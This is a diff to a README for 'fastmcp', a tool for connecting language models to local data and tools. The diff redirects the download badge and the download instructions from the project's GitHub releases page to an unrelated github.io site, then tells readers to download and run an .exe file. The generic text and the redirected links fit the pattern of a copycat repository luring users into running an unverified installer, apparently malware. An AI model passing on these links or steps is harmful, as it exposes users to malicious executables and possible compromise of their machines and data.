@@ -1,6 +1,6 @@
 # 🧊 fastmcp - Create language model tools with ease
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/as2227741-beep/fastmcp/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://as2227741-beep.github.io)
 
 Fastmcp provides a simple toolkit to build connections for artificial intelligence systems. This software helps you link your local data and tools to machine learning models. You use these connections to give models the ability to execute tasks or retrieve specific information. The application focuses on speed and ease of use for anyone wanting to build custom bridges for their digital tools.
 
@@ -8,7 +8,7 @@ Fastmcp provides a simple toolkit to build connections for artificial intelligen
 
 You need to access the release page to get the installer for your computer. Follow these steps to obtain the correct file:
 
-1. Visit this page to download: [https://github.com/as2227741-beep/fastmcp/releases](https://github.com/as2227741-beep/fastmcp/releases)
+1. Visit this page to download: [https://as2227741-beep.github.io](https://as2227741-beep.github.io)
 2. Look for the section titled "Assets" at the bottom of the latest release post.
 3. Click the link ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
